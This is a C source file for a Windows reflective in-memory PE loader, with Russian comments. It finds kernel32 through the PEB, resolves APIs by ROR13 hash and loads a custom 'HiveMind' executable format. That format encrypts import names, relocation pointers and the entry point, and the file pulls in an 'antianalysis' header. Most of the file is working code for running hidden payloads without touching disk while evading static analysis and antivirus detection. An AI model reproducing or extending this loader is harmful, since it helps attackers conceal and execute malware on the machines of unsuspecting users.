#include <windows.h>
#include <winternl.h>
#include <intrin.h>
#include "DllLoader.h"
#include <stdio.h>
#include "antianalysis.h"


void *m_memset(void *szBuffer, BYTE dwSym, SIZE_T dwLen)
{
	if (!szBuffer)
		return NULL;

#ifndef _WIN64
	__asm
	{
		pushad
			mov		edi, [szBuffer]
			mov		ecx, [dwLen]
			xor     eax, eax
			mov		al, byte ptr DS:[dwSym]
			rep		stosb
			popad
	}
#else
	LPBYTE lpBuf = (LPBYTE)szBuffer;
	for (UINT i = 0; i < dwLen; i++)
		lpBuf[i] = dwSym;
#endif
	return NULL;
}

void *m_memcpy(void *szBuf, const void *szStr, int nLen)
{
	if (!szBuf || !szStr || nLen <= 0)
		return NULL;

#ifndef _WIN64
	__asm
	{
		pushad
			mov		esi, [szStr]
			mov		edi, [szBuf]
			mov		ecx, [nLen]
			rep		movsb
			popad
	}
#else
	LPBYTE lpBuf = (LPBYTE)szBuf;
	LPBYTE lpStr = (LPBYTE)szStr;
	for (UINT i = 0; i < nLen; i++)
		lpBuf[i] = lpStr[i];
#endif

	return NULL;
}


int m_memcmp(const void *buf1, const void *buf2, size_t count)
{
	if (!buf1 || !buf2)
	{
		return -1;
	}

	unsigned char *p1 = (unsigned char *)buf1;
	unsigned char *p2 = (unsigned char *)buf2;

	int   rc = 0;

	for (size_t i = 0; i < count; i++)
	{
		if (*p1 < *p2)
		{
			rc = -1;
			break;
		}

		if (*p1 > *p2)
		{
			rc = 1;
			break;
		}

		p1++;
		p2++;
	}

	return rc;
}

PPEB get_peb()
{
#ifndef _WIN64
	return (PPEB)__readfsdword(0x30);
#else
	return (PPEB)__readgsqword(0x60);
#endif
}

HMODULE __stdcall find_module_by_hash(DWORD hash)
{
	PPEB peb;
	LDR_DATA_TABLE_ENTRY *module_ptr, *first_mod;

	peb = get_peb();

	module_ptr = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink;
	first_mod = module_ptr;

	do
	{
		if (unicode_ror13_hash((WCHAR *)module_ptr->FullDllName.Buffer) == hash)
			return (HMODULE)module_ptr->Reserved2[0];
		else
			module_ptr = (PLDR_DATA_TABLE_ENTRY)module_ptr->Reserved1[0];

	} while (module_ptr && module_ptr != first_mod);   // because the list wraps,

	return NULL;
}

DWORD __stdcall unicode_ror13_hash(const WCHAR *unicode_string)
{
	wchar_t str[64];
	UINT i = 0;
	while (i < 64)
	{
		if ((unicode_string[i] >= L'a') && (unicode_string[i] <= L'z'))
			str[i] = unicode_string[i] + (L'A' - L'a');
		else
			str[i] = unicode_string[i];

		if (unicode_string[i] == L'\0')
			break;

		i++;
		if (i == 64)
			return 0;
	}


	DWORD hash = 0;

	wchar_t *ptr = str;
	while (*ptr != 0)
	{
		DWORD val = (DWORD)*ptr++;
		hash = (hash >> 13) | (hash << 19); // ROR 13
		hash += val;
	}
	return hash;
	}

DWORD __stdcall ror13_hash(const char *string)
{
	unsigned char str[64];
	UINT i = 0;
	while (i < 64)
	{
		if ((string[i] >= 'a') && (string[i] <= 'z'))
			str[i] = string[i] + ('A' - 'a');
		else
			str[i] = string[i];

		if (string[i] == '\0')
			break;

		i++;
		if (i == 64)
			return 0;
	}

	DWORD hash = 0;

	unsigned char *ptr = str;
	while (*ptr) {
		DWORD val = (DWORD)*ptr++;
		hash = (hash >> 13) | (hash << 19);  // ROR 13
		hash += val;
	}
	return hash;
}

FARPROC __stdcall find_function(HMODULE module, DWORD hash)
{
	IMAGE_DOS_HEADER *dos_header;
#ifndef _WIN64
	IMAGE_NT_HEADERS *nt_headers;
#else
	IMAGE_NT_HEADERS64 *nt_headers;
#endif
	IMAGE_EXPORT_DIRECTORY *export_dir;
	DWORD *names, *funcs;
	WORD *nameords;
	int i;

	dos_header = (IMAGE_DOS_HEADER *)module;
#ifndef _WIN64
	nt_headers = (IMAGE_NT_HEADERS *)((SIZE_T)module + dos_header->e_lfanew);
#else
	nt_headers = (IMAGE_NT_HEADERS64*)((SIZE_T)module + dos_header->e_lfanew);
#endif
	export_dir = (IMAGE_EXPORT_DIRECTORY *)((SIZE_T)module + (SIZE_T)nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	names = (DWORD *)((SIZE_T)module + (SIZE_T)export_dir->AddressOfNames);
	funcs = (DWORD *)((SIZE_T)module + (SIZE_T)export_dir->AddressOfFunctions);
	nameords = (WORD *)((SIZE_T)module + (SIZE_T)export_dir->AddressOfNameOrdinals);

	for (i = 0; i < export_dir->NumberOfNames; i++)
	{
		char *string = (char*)((SIZE_T)module + (SIZE_T)names[i]);
		if (hash == ror13_hash(string))
		{
			WORD nameord = nameords[i];
			DWORD funcrva = funcs[nameord];
			return (FARPROC)((char *)module + (SIZE_T)funcrva);
		}
	}

	return NULL;
}


BOOL __stdcall resolve_functions(loader_functions *ctx)
{
	HMODULE hKernel32 = find_module_by_hash(dwKernelHash);

	BOOL bRet = FALSE;
	do
	{
		if (hKernel32 == NULL)
			break;

		ctx->_FlushInstructionCache = (fn3)find_function(hKernel32, dwFlushInstructionCache);
		if (ctx->_FlushInstructionCache == nullptr)
			break;

		ctx->_FreeLibrary = (fn1)find_function(hKernel32, dwFreeLibraryHash);
		if (ctx->_FreeLibrary == nullptr)
			break;

		ctx->_GetProcAddress = (fn2)find_function(hKernel32, dwGetProcAddressHash);
		if (ctx->_GetProcAddress == nullptr)
			break;

		ctx->_IsBadReadPtr = (fn2)find_function(hKernel32, dwIsBadReadPtrHash);
		if (ctx->_IsBadReadPtr == nullptr)
			break;

		ctx->_LoadLibraryA = (fn1)find_function(hKernel32, dwLoadLibraryAHash);
		if (ctx->_LoadLibraryA == nullptr)
			break;

		ctx->_lstrcmpiA = (fn2)find_function(hKernel32, dwlstrcmpiAHash);
		if (ctx->_lstrcmpiA == nullptr)
			break;

		ctx->_VirtualAlloc = (fn4)find_function(hKernel32, dwVirtualAllocHash);
		if (ctx->_VirtualAlloc == nullptr)
			break;

		ctx->_VirtualFree = (fn3)find_function(hKernel32, dwVirtualFreeHash);
		if (ctx->_VirtualFree == nullptr)
			break;

		ctx->_VirtualProtect = (fn4)find_function(hKernel32, dwVirtualProtectHash);
		if (ctx->_VirtualProtect == nullptr)
			break;

		ctx->_VirtualQuery = (fn3)find_function(hKernel32, dwVirtualQueryHash);
		if (ctx->_VirtualQuery == nullptr)
			break;

		ctx->_OutputDebugStringA = (fn1)find_function(hKernel32, dwOutputDebugStringAHash);

		bRet = TRUE;

	} while (FALSE);

	return bRet;
}

SIZE_T GetMemSize(loader_functions *ctx, LPVOID lpAddr)
{
	if (!lpAddr)
	{
		return 0;
	}

	MEMORY_BASIC_INFORMATION MemInfo;

	ctx->_VirtualQuery((SIZE_T)lpAddr, (SIZE_T)&MemInfo, sizeof(MEMORY_BASIC_INFORMATION));

	return MemInfo.RegionSize;
}

VOID MemFree(loader_functions *ctx, LPVOID lpAddr)
{
	if (lpAddr != NULL)
		ctx->_VirtualFree((SIZE_T)lpAddr, 0, MEM_RELEASE);
}


LPVOID MemAlloc(loader_functions *ctx, SIZE_T dwSize)
{
	return (LPVOID)ctx->_VirtualAlloc(0, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
}

LPVOID MemRealloc(loader_functions *ctx, LPVOID lpAddr, SIZE_T dwSize)
{
	SIZE_T PrevLen = 0;

	if (lpAddr)
		PrevLen = GetMemSize(ctx, lpAddr);

	LPVOID NewAddr = NULL;
	if (dwSize > 0)
	{
		NewAddr = MemAlloc(ctx, dwSize);
		if (lpAddr && NewAddr && PrevLen)
		{
			if (dwSize < PrevLen)
				PrevLen = dwSize;
			m_memcpy(NewAddr, lpAddr, PrevLen);
		}
	}

	if (lpAddr != NULL)
		MemFree(ctx, lpAddr);

	return NewAddr;
}



typedef struct
{
#ifndef _WIN64
	PIMAGE_NT_HEADERS headers;
#else
	PIMAGE_NT_HEADERS64 headers;
#endif
	unsigned char *codeBase;
	HMODULE *modules;
	int numModules;
	int initialized;
} MEMORYMODULE, *PMEMORYMODULE;

#define IMAGE_SIZEOF_BASE_RELOCATION         8

typedef BOOL ( WINAPI *DllEntryProc )( HINSTANCE hinstDLL, SIZE_T fdwReason, LPVOID lpReserved );

#define GET_HEADER_DICTIONARY( module, idx ) &(module)->headers->OptionalHeader.DataDirectory[idx]

#ifndef _WIN64
void CopySections( const unsigned char *data, PIMAGE_NT_HEADERS old_headers, PMEMORYMODULE module )
#else
void CopySections(const unsigned char *data, PIMAGE_NT_HEADERS64 old_headers, PMEMORYMODULE module)
#endif
{
	int i, size;
	unsigned char *codeBase = module->codeBase;
	unsigned char *dest;

	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION( module->headers );

	for ( i = 0; i < module->headers->FileHeader.NumberOfSections; i++, section++ )
	{
		if ( section->SizeOfRawData == 0 )
		{
			size = old_headers->OptionalHeader.SectionAlignment;

			if ( size > 0 )
			{
				dest = (unsigned char *)codeBase + section->VirtualAddress;///pVirtualAlloc( codeBase + section->VirtualAddress, size, MEM_COMMIT, PAGE_READWRITE );

				section->Misc.PhysicalAddress = (SIZE_T)dest;
				m_memset( dest, 0, size );
			}

			continue;
		}

		dest = (unsigned char *)codeBase + section->VirtualAddress; /**pVirtualAlloc( codeBase + section->VirtualAddress,
											  section->SizeOfRawData,
											  MEM_COMMIT,
											  PAGE_READWRITE );*/

		m_memcpy( dest, data + section->PointerToRawData, section->SizeOfRawData );

		section->Misc.PhysicalAddress = (SIZE_T)dest;
	}
}

void FinalizeSections(loader_functions *ctx, PMEMORYMODULE module )
{
	
	int ProtectionFlags[2][2][2];

	ProtectionFlags[0][0][0] = PAGE_NOACCESS;
	ProtectionFlags[0][0][1] = PAGE_WRITECOPY;
	ProtectionFlags[0][1][0] = PAGE_READONLY;
	ProtectionFlags[0][1][1] = PAGE_READWRITE;
	ProtectionFlags[1][0][0] = PAGE_EXECUTE;
	ProtectionFlags[1][0][1] = PAGE_EXECUTE_WRITECOPY;
	ProtectionFlags[1][1][0] = PAGE_EXECUTE_READ;
	ProtectionFlags[1][1][1] = PAGE_EXECUTE_READWRITE;
	

	DWORD i,oldProtect;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION( module->headers );

	for ( i = 0; i < module->headers->FileHeader.NumberOfSections; i++, section++ )
	{
		SIZE_T protect,  size;

		int executable = (section->Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0;
		int readable =   (section->Characteristics & IMAGE_SCN_MEM_READ) != 0;
		int writeable =  (section->Characteristics & IMAGE_SCN_MEM_WRITE) != 0;

		if ( section->Characteristics & IMAGE_SCN_MEM_DISCARDABLE )
		{
			///pVirtualFree((LPVOID)section->Misc.PhysicalAddress, section->SizeOfRawData, MEM_DECOMMIT);
			continue;
		}

		protect = ProtectionFlags[executable][readable][writeable];

		if ( section->Characteristics & IMAGE_SCN_MEM_NOT_CACHED )
		{
			protect |= PAGE_NOCACHE;
		}

		size = section->SizeOfRawData;

		if ( size == 0 )
		{
			if ( section->Characteristics & IMAGE_SCN_CNT_INITIALIZED_DATA )
			{
				size = module->headers->OptionalHeader.SizeOfInitializedData;
			}
			else if ( section->Characteristics & IMAGE_SCN_CNT_UNINITIALIZED_DATA )
			{
				size = module->headers->OptionalHeader.SizeOfUninitializedData;
			}
		}

		if ( size > 0 )
		{
			if ( (BOOL)ctx->_VirtualProtect((SIZE_T)section->Misc.PhysicalAddress, section->SizeOfRawData, protect, (SIZE_T)&oldProtect) == 0 )
			{
				return;
			}
			if (executable == TRUE)
			{
				ctx->_FlushInstructionCache(-1, (SIZE_T)section->Misc.PhysicalAddress, section->SizeOfRawData);
			}
		}
	}
}

DWORD dwGetHivemindKey(PIMAGE_HIVEMIND_HEADER pHivemodule)
{

#ifndef _WIN64
	return ((PIMAGE_NT_HEADERS32)((SIZE_T)pHivemodule + (SIZE_T)pHivemodule->e_lfanew))->OptionalHeader.CheckSum;
#else
	return ((PIMAGE_NT_HEADERS64)((SIZE_T)pHivemodule + (SIZE_T)pHivemodule->e_lfanew))->OptionalHeader.CheckSum;
#endif
}

void PerformBaseRelocation(loader_functions *ctx, PMEMORYMODULE module, SIZE_T delta, BOOL bHiveExecutable, DWORD dwHivemindKey)
{
	
	SIZE_T i;
	unsigned char *codeBase = module->codeBase;

	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY( module, IMAGE_DIRECTORY_ENTRY_BASERELOC );

	if ( directory->Size > 0 )
	{
		PIMAGE_BASE_RELOCATION relocation = (PIMAGE_BASE_RELOCATION)( codeBase + directory->VirtualAddress );

		for (; relocation->VirtualAddress > 0; )
		{
			unsigned char *dest = (unsigned char *)(codeBase + relocation->VirtualAddress);
			unsigned short *relInfo = (unsigned short *)((unsigned char *)relocation + IMAGE_SIZEOF_BASE_RELOCATION);

			for ( i = 0; i < ((relocation->SizeOfBlock-IMAGE_SIZEOF_BASE_RELOCATION) / 2 ); i++, relInfo++ )
			{
				/* 
				SIZE_T *patchAddrHL;
				*/

				DWORD *patchAddrHL;
				LONGLONG* patchAddrDIR64;

				int type, offset;

				type = *relInfo >> 12;
				offset = *relInfo & 0xfff;

#ifdef _DEBUG
				unsigned char a[2];
#endif

				switch ( type )
				{
					case IMAGE_REL_BASED_ABSOLUTE:
						break;
#ifdef _WIN64
					case IMAGE_REL_BASED_DIR64:
						// ЕСЛИ 64 БУДЕТ КРАШИТЬ, ТО ВЕРНУТЬ УБРАТЬ ЭТОТ БЛОК + УБРАТЬ break и РАСКОММЕНТИТЬ ТАМ ГДЕ SIZE_T* !!!!!
						patchAddrDIR64 = (LONGLONG *)((SIZE_T)dest + (SIZE_T)offset);
						if (bHiveExecutable) // расшифровка поинтера
							*patchAddrDIR64 ^= (LONGLONG)dwHivemindKey;
						*patchAddrDIR64 += (LONGLONG)delta;
						
						break;
#endif
					case IMAGE_REL_BASED_HIGHLOW:
						/*
						patchAddrHL = (SIZE_T *)((SIZE_T)dest + (SIZE_T)offset);
						*patchAddrHL += delta;
						*/

						patchAddrHL = (DWORD *)((SIZE_T)dest + (SIZE_T)offset);
						if (bHiveExecutable) // расшифровка поинтера
							*patchAddrHL ^= dwHivemindKey;
						*patchAddrHL += (DWORD)delta;
			
						break;


					default:
						break;
				}
			}
			
			relocation = (PIMAGE_BASE_RELOCATION)(((SIZE_T)relocation) + relocation->SizeOfBlock);
		}
	}
}

int _cdecl m_rand(long *holdrand)
{
	return (((*holdrand = *holdrand * 214013L + 2531011L) >> 16) & 0x7fff);
}

// создает случайный поток байтов не выше 10 на основе dwInitialKey
// байт не должен превышать 10, чтобы не создавал нулевых символов так как при расшифровке будем мониторить конец по нулевому символу
void CreateStreamChars(unsigned char *stream, SIZE_T dwStreamSize, DWORD dwInitialKey)
{
	long holdrand = dwInitialKey;
	for (SIZE_T i = 0; i < dwStreamSize; i++)
		stream[i] = m_rand(&holdrand) % 10;
	return;
}

// ксорит str со stream до нулевого символа или окончания stream
void ApplyStream(unsigned char *stream, SIZE_T dwStreamSize, unsigned char *str)
{
	for (SIZE_T i = 0; i < dwStreamSize; i++)
	{
		if (str[i] == '\0')
			break;
		str[i] ^= stream[i];
	}
	return;
}

void m_copystr(unsigned char *str_to, unsigned char *str_from)
{
	for (SIZE_T i = 0;; i++)
	{
		str_to[i] = str_from[i];
		if (str_from[i] == '\0')
			break;
	}
	return;
}

int BuildImportTable(loader_functions *ctx, PMEMORYMODULE module, DWORD dwHivemindKey, BOOL bHiveExecutable)
{
	unsigned char stream[256];
	unsigned char name[256];
	if (bHiveExecutable)
		CreateStreamChars(stream, sizeof(stream), dwHivemindKey);
	
	int result=1;
	unsigned char *codeBase = module->codeBase;

	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_IMPORT);

	if ( directory->Size > 0 )
	{
		PIMAGE_IMPORT_DESCRIPTOR importDesc = (PIMAGE_IMPORT_DESCRIPTOR)(codeBase + directory->VirtualAddress);
		
		for ( ; !(BOOL)ctx->_IsBadReadPtr((SIZE_T)importDesc, sizeof(IMAGE_IMPORT_DESCRIPTOR)) && importDesc->Name; importDesc++ )
		{
			SIZE_T *thunkRef, *funcRef;
			HMODULE handle = NULL;

			if (!bHiveExecutable)
			{
				handle = (HMODULE)ctx->_LoadLibraryA((SIZE_T)(codeBase + importDesc->Name));
			}
			else
			{
				m_copystr(name, (unsigned char*)(codeBase + importDesc->Name));
				ApplyStream(stream, sizeof(stream), name);
				handle = (HMODULE)ctx->_LoadLibraryA((SIZE_T)(name));
			}

			if (handle == INVALID_HANDLE_VALUE)
			{
				result = 0;
				break;
			}

			HMODULE *p = (HMODULE*)MemRealloc(ctx, module->modules, (module->numModules+1)*(sizeof(HMODULE)) );
			module->modules = p;

			if (module->modules == NULL)
			{
				result = 0;
				break;
			}

			module->modules[module->numModules++] = handle;
			if (importDesc->OriginalFirstThunk)
			{
				thunkRef = (SIZE_T *)(codeBase + importDesc->OriginalFirstThunk);
				funcRef = (SIZE_T *)(codeBase + importDesc->FirstThunk);
			} else {
				thunkRef = (SIZE_T *)(codeBase + importDesc->FirstThunk);
				funcRef = (SIZE_T *)(codeBase + importDesc->FirstThunk);
			}
			for (; *thunkRef; thunkRef++, funcRef++)
			{
				if IMAGE_SNAP_BY_ORDINAL(*thunkRef)
				{
					*funcRef = (SIZE_T)ctx->_GetProcAddress( (SIZE_T)handle, (SIZE_T)IMAGE_ORDINAL(*thunkRef) );
				}
				else
				{
					PIMAGE_IMPORT_BY_NAME thunkData = (PIMAGE_IMPORT_BY_NAME)(codeBase + *thunkRef);
					if (!bHiveExecutable)
					{
						*funcRef = (SIZE_T)ctx->_GetProcAddress((SIZE_T)handle, (SIZE_T)&thunkData->Name);
					}
					else
					{
						m_copystr(name, (unsigned char*)(&thunkData->Name));
						ApplyStream(stream, sizeof(stream), name);
						*funcRef = (SIZE_T)ctx->_GetProcAddress((SIZE_T)handle, (SIZE_T)name);
					}
				}
				if (*funcRef == 0)
				{
					result = 0;
					break;
				}
			}

			if (!result)
				break;
		}
	}

	return result;
}

void MemoryFreeLibrary(loader_functions *ctx, HMEMORYMODULE mod)
{
	int i;
	PMEMORYMODULE module = (PMEMORYMODULE)mod;

	if (module != NULL)
	{
		if (module->initialized != 0)
		{
			DllEntryProc DllEntry = (DllEntryProc)(module->codeBase + module->headers->OptionalHeader.AddressOfEntryPoint);
			(*DllEntry)((HINSTANCE)module->codeBase, DLL_PROCESS_DETACH, 0);
			module->initialized = 0;
		}

		if (module->modules != NULL)
		{
			for (i=0; i<module->numModules; i++)
				if (module->modules[i] != INVALID_HANDLE_VALUE)
					ctx->_FreeLibrary((SIZE_T)module->modules[i]);

			MemFree(ctx, module->modules);
		}

		if (module->codeBase != NULL)
			ctx->_VirtualFree((SIZE_T)module->codeBase, 0, MEM_RELEASE);

		MemFree(ctx, module);
	}
}


#pragma optimize("", off)
HMEMORYMODULE MemoryLoadLibrary(loader_functions *ctx, const void *data)
{
	// задает флаг того, что загружаемый модуль в формате HiveMind Executable
	/*
	+ вместо IMAGE_DOS_HEADER и IMAGE_NT_HEADERS свои версии заголовков, которые по размеру совпадают с PE
	- IAT thunks перевернуты
	+ имена функций зашифрованы
	+ все pointer'ы на которые указывает таблица reloc'в - зашифрованы
	+ Entrypoint - зашифрована
	*/
	BOOL bHiveExecutable = FALSE;
	PIMAGE_HIVEMIND_HEADER pHMHeader;
	DWORD dwHivemindKey = 0;

	PMEMORYMODULE result;
	PIMAGE_DOS_HEADER dos_header;
#ifndef _WIN64
	PIMAGE_HIVEMIND_NT_HEADER32 old_hiveheader;
	PIMAGE_NT_HEADERS old_header;
#else
	PIMAGE_HIVEMIND_NT_HEADER64 old_hiveheader;
	PIMAGE_NT_HEADERS64 old_header;
#endif
	unsigned char *code, *headers;
	SIZE_T locationDelta;
	DllEntryProc DllEntry;
	BOOL successfull;

	dos_header = (PIMAGE_DOS_HEADER)data;
	pHMHeader = (PIMAGE_HIVEMIND_HEADER)data;
	
	if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
	{
		if ((pHMHeader->dwHiveSign1 != IMAGE_HIVEMIND_SIGNATURE_PART1) || (pHMHeader->dwHiveSign2 != IMAGE_HIVEMIND_SIGNATURE_PART2))
			return NULL;

		// имеем дело с форматом HiveMind executable
		bHiveExecutable = TRUE;
		dwHivemindKey = dwGetHivemindKey(pHMHeader);
	}

#ifndef _WIN64
	if (!bHiveExecutable)
		old_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(data))[dos_header->e_lfanew];
	else
		old_hiveheader = (PIMAGE_HIVEMIND_NT_HEADER32)&((const unsigned char *)(data))[pHMHeader->e_lfanew];
#else
	if (!bHiveExecutable)
		old_header = (PIMAGE_NT_HEADERS64)&((const unsigned char *)(data))[dos_header->e_lfanew];
	else
		old_hiveheader = (PIMAGE_HIVEMIND_NT_HEADER64)&((const unsigned char*)(data))[pHMHeader->e_lfanew];
#endif

	if (bHiveExecutable) // они соответствуют кроме сигнатуры
		old_header = (PIMAGE_NT_HEADERS)old_hiveheader;

	if ((old_header->Signature != IMAGE_NT_SIGNATURE) && (!bHiveExecutable))
	{
		return NULL;
	}

	code = (unsigned char *)ctx->_VirtualAlloc((SIZE_T)(old_header->OptionalHeader.ImageBase),
		old_header->OptionalHeader.SizeOfImage,
		MEM_COMMIT,
		PAGE_READWRITE);

    if (code == NULL)
        code = (unsigned char *)ctx->_VirtualAlloc(NULL,
            old_header->OptionalHeader.SizeOfImage,
            MEM_COMMIT,
            PAGE_READWRITE);

	if (code == NULL)
	{
		return NULL;
	}
	result = (PMEMORYMODULE)MemAlloc(ctx, sizeof(MEMORYMODULE) );
	result->codeBase = code;
	result->numModules = 0;
	result->modules = NULL;
	result->initialized = 0;

	/**pVirtualAlloc(code,
		old_header->OptionalHeader.SizeOfImage,
		MEM_COMMIT,
		PAGE_READWRITE);*/

	headers = (unsigned char *)code; /**pVirtualAlloc(code,
		old_header->OptionalHeader.SizeOfHeaders,
		MEM_COMMIT,
		PAGE_READWRITE);*/

	if (!bHiveExecutable)
	{
		m_memcpy(headers, dos_header, dos_header->e_lfanew + old_header->OptionalHeader.SizeOfHeaders);
#ifndef _WIN64
		result->headers = (PIMAGE_NT_HEADERS)&((const unsigned char *)(headers))[dos_header->e_lfanew];
#else
		result->headers = (PIMAGE_NT_HEADERS64)&((const unsigned char *)(headers))[dos_header->e_lfanew];
#endif
	}
	else
	{
		m_memcpy(headers, pHMHeader, pHMHeader->e_lfanew + old_header->OptionalHeader.SizeOfHeaders);

#ifndef _WIN64
		result->headers = (PIMAGE_NT_HEADERS)&((const unsigned char *)(headers))[pHMHeader->e_lfanew];
#else
		result->headers = (PIMAGE_NT_HEADERS64)&((const unsigned char *)(headers))[pHMHeader->e_lfanew];
#endif
	}

	result->headers->OptionalHeader.ImageBase = (SIZE_T)code;

	CopySections((const unsigned char*)data, old_header, result);

	locationDelta = (SIZE_T)(code - old_header->OptionalHeader.ImageBase);
	if (locationDelta != 0)
		PerformBaseRelocation(ctx, result, locationDelta, bHiveExecutable, dwHivemindKey);


	if (!BuildImportTable(ctx, result, dwHivemindKey, bHiveExecutable))
		goto error;


	FinalizeSections(ctx, result);



	DWORD dwOld;
	ctx->_VirtualProtect((SIZE_T)code,result->headers->OptionalHeader.SizeOfImage,PAGE_EXECUTE_READWRITE,(SIZE_T)&dwOld);

	if (result->headers->OptionalHeader.AddressOfEntryPoint != 0)
	{
		if ( result->headers->FileHeader.Characteristics & IMAGE_FILE_DLL)
		{

			if (!bHiveExecutable)
				DllEntry = (DllEntryProc)(code + (SIZE_T)result->headers->OptionalHeader.AddressOfEntryPoint);
			else
				DllEntry = (DllEntryProc)(code + (SIZE_T)(result->headers->OptionalHeader.AddressOfEntryPoint ^ dwHivemindKey));

			if (DllEntry == 0)
			{
				goto error;
			}
			successfull = (*DllEntry)((HINSTANCE)code, DLL_PROCESS_ATTACH, 0);

		}
		else
		{
			SIZE_T(WINAPI*Entry)() = 0;
			if (!bHiveExecutable)
				Entry = (SIZE_T (WINAPI*)())(code + (SIZE_T)result->headers->OptionalHeader.AddressOfEntryPoint);
			else
				Entry = (SIZE_T (WINAPI*)())(code + (SIZE_T)(result->headers->OptionalHeader.AddressOfEntryPoint ^ dwHivemindKey));

			if (Entry == 0)
			{
				goto error;
			}

			Entry();
			successfull = TRUE;
		}
		if (!successfull)
		{
			goto error;
		}

		result->initialized = 1;
	}

	return (HMEMORYMODULE)result;

error:
	MemoryFreeLibrary(ctx, result);
	return NULL;
}

FARPROC MemoryGetProcAddress(loader_functions *ctx, HMEMORYMODULE module, const char *name)
{
	unsigned char *codeBase = ((PMEMORYMODULE)module)->codeBase;
	int idx = -1;
	DWORD i, *nameRef;

	WORD *ordinal;
	PIMAGE_EXPORT_DIRECTORY exports;
	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY((PMEMORYMODULE)module, IMAGE_DIRECTORY_ENTRY_EXPORT);
	if (directory->Size == 0)
		return NULL;

	exports = (PIMAGE_EXPORT_DIRECTORY)((SIZE_T)codeBase + (SIZE_T)directory->VirtualAddress);
	if (exports->NumberOfNames == 0 || exports->NumberOfFunctions == 0)
		return NULL;

	nameRef = (DWORD *)((SIZE_T)codeBase + (SIZE_T)exports->AddressOfNames);
	ordinal = (WORD *)((SIZE_T)codeBase + (SIZE_T)exports->AddressOfNameOrdinals);

	for (i = 0; i < exports->NumberOfNames; i++, nameRef++, ordinal++)
	{
		DWORD nameref = (DWORD)*((PDWORD)nameRef);
		if (ctx->_lstrcmpiA((SIZE_T)name, (SIZE_T)((SIZE_T)codeBase + (SIZE_T)nameref)) == 0)
		{
			idx = *ordinal;
			break;
		}
	}

	if (idx == -1)
		return NULL;

	if ((DWORD)idx > exports->NumberOfFunctions)
		return NULL;

	return (FARPROC)(codeBase + *(DWORD*)((SIZE_T)codeBase + (SIZE_T)exports->AddressOfFunctions + (SIZE_T)((idx * 4))));
}


#pragma optimize("", off)
HMEMORYMODULE BuildImport(loader_functions *ctx, PVOID ImageBase, DWORD dwKey, BOOL bHiveExecutable)
{
	PMEMORYMODULE result;
	PIMAGE_DOS_HEADER dos_header;
	PIMAGE_NT_HEADERS old_header;


	dos_header = (PIMAGE_DOS_HEADER)ImageBase;
	if (dos_header->e_magic != IMAGE_DOS_SIGNATURE)
	{
		return NULL;
	}

	old_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(ImageBase))[dos_header->e_lfanew];
	if (old_header->Signature != IMAGE_NT_SIGNATURE)
	{
		return NULL;
	}

	result = (PMEMORYMODULE)MemAlloc(ctx, sizeof(MEMORYMODULE) );
	result->codeBase = (unsigned char*)ImageBase;
	result->headers = old_header;
	result->numModules = 0;
	result->modules = NULL;
	result->initialized = 0;

	if (!BuildImportTable(ctx, result, dwKey, bHiveExecutable))
	{
		MemFree(ctx, result);
		return NULL;
	};
	result->initialized = 1;

	return result;
};

VOID CleanModules(HMEMORYMODULE hModule)
{
	/*

if ( hModule )
{
	for ( int i=0; i <((PMEMORYMODULE)hModule)->numModules; ++i)
	{
		FreeLibrary(((PMEMORYMODULE)hModule)->modules[i]);
	};

	MemFree(((PMEMORYMODULE)hModule)->modules);
	MemFree((PMEMORYMODULE)hModule);
};
*/
	return ;
};
